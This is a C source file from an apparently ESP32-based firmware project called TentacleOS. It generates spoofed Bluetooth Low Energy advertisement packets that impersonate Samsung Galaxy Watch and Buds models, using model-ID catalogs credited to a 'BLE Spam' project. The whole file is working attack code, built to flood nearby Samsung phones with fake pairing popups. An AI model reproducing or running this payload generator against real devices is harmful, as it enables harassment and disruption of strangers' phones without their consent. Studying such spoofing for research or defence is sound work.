// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "samsung_spam.h"

#include <string.h>

#include "esp_random.h"

// Device catalog: WillyJL / Spooks4576, BLE Spam (GPL-3.0); see docs/bluetooth/DEVICE_CATALOG.md.

static const char *TAG = "SAMSUNG_SPAM";

#define SAMSUNG_PAYLOAD_SIZE      15
#define SAMSUNG_BUDS_PAYLOAD_SIZE 31
#define SAMSUNG_DEVICE_KIND_COUNT 2
#define SAMSUNG_BUDS_KIND         1

typedef struct {
  uint8_t value;
} samsung_spam_watch_model_t;

static const samsung_spam_watch_model_t WATCH_MODELS[] = {
    {0x1A}, // Fallback Watch
    {0x01}, // White Watch4 Classic 44m
    {0x02}, // Black Watch4 Classic 40m
    {0x03}, // White Watch4 Classic 40m
    {0x04}, // Black Watch4 44mm
    {0x05}, // Silver Watch4 44mm
    {0x06}, // Green Watch4 44mm
    {0x07}, // Black Watch4 40mm
    {0x08}, // White Watch4 40mm
    {0x09}, // Gold Watch4 40mm
    {0x0A}, // French Watch4
    {0x0B}, // French Watch4 Classic
    {0x0C}, // Fox Watch5 44mm
    {0x11}, // Black Watch5 44mm
    {0x12}, // Sapphire Watch5 44mm
    {0x13}, // Purpleish Watch5 40mm
    {0x14}, // Gold Watch5 40mm
    {0x15}, // Black Watch5 Pro 45mm
    {0x16}, // Gray Watch5 Pro 45mm
    {0x17}, // White Watch5 44mm
    {0x18}, // White & Black Watch5
    {0xE4}, // Black Watch5 Golf Edition
    {0xE5}, // White Watch5 Gold Edition
    {0x1B}, // Black Watch6 Pink 40mm
    {0x1C}, // Gold Watch6 Gold 40mm
    {0x1D}, // Silver Watch6 Cyan 44mm
    {0x1E}, // Black Watch6 Classic 43m
    {0x20}, // Green Watch6 Classic 43m
    {0xEC}, // Black Watch6 Golf Edition
    {0xEF}, // Black Watch6 TB Edition
};
#define WATCH_MODELS_COUNT (sizeof(WATCH_MODELS) / sizeof(WATCH_MODELS[0]))

static const uint32_t BUDS_MODELS[] = {
    0xEE7A0C, // Fallback Buds
    0x9D1700, // Fallback Dots
    0x39EA48, // Light Purple Buds2
    0xA7C62C, // Bluish Silver Buds2
    0x850116, // Black Buds Live
    0x3D8F41, // Gray & Black Buds2
    0x3B6D02, // Bluish Chrome Buds2
    0xAE063C, // Gray Beige Buds2
    0xB8B905, // Pure White Buds
    0xEAAA17, // Pure White Buds2
    0xD30704, // Black Buds
    0x9DB006, // French Flag Buds
    0x101F1A, // Dark Purple Buds Live
    0x859608, // Dark Blue Buds
    0x8E4503, // Pink Buds
    0x2C6740, // White & Black Buds2
    0x3F6718, // Bronze Buds Live
    0x42C519, // Red Buds Live
    0xAE073A, // Black & White Buds2
    0x011716, // Sleek Black Buds2
};
#define BUDS_MODELS_COUNT (sizeof(BUDS_MODELS) / sizeof(BUDS_MODELS[0]))

int generate_samsung_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL)
    return 0;

  if (esp_random() % SAMSUNG_DEVICE_KIND_COUNT == SAMSUNG_BUDS_KIND) {
    if (max_len < SAMSUNG_BUDS_PAYLOAD_SIZE)
      return 0;
    uint32_t model = BUDS_MODELS[esp_random() % BUDS_MODELS_COUNT];
    // EasySetup Buds retains the source's truncated second manufacturer AD segment.
    uint8_t packet[SAMSUNG_BUDS_PAYLOAD_SIZE] = {0x1B,
                                                 0xFF,
                                                 0x75,
                                                 0x00,
                                                 0x42,
                                                 0x09,
                                                 0x81,
                                                 0x02,
                                                 0x14,
                                                 0x15,
                                                 0x03,
                                                 0x21,
                                                 0x01,
                                                 0x09,
                                                 (uint8_t)(model >> 16),
                                                 (uint8_t)(model >> 8),
                                                 0x01,
                                                 (uint8_t)model,
                                                 0x06,
                                                 0x3C,
                                                 0x94,
                                                 0x8E,
                                                 0x00,
                                                 0x00,
                                                 0x00,
                                                 0x00,
                                                 0xC7,
                                                 0x00,
                                                 0x10,
                                                 0xFF,
                                                 0x75};
    memcpy(buffer, packet, sizeof(packet));
    return sizeof(packet);
  }

  uint8_t model = WATCH_MODELS[esp_random() % WATCH_MODELS_COUNT].value;
  uint8_t packet[SAMSUNG_PAYLOAD_SIZE] = {0x0E,
                                          0xFF,
                                          0x75,
                                          0x00,
                                          0x01,
                                          0x00,
                                          0x02,
                                          0x00,
                                          0x01,
                                          0x01,
                                          0xFF,
                                          0x00,
                                          0x00,
                                          0x43,
                                          (uint8_t)((model >> 0x00) & 0xFF)};
  if (max_len < SAMSUNG_PAYLOAD_SIZE)
    return 0;
  memcpy(buffer, packet, SAMSUNG_PAYLOAD_SIZE);
  return SAMSUNG_PAYLOAD_SIZE;
}
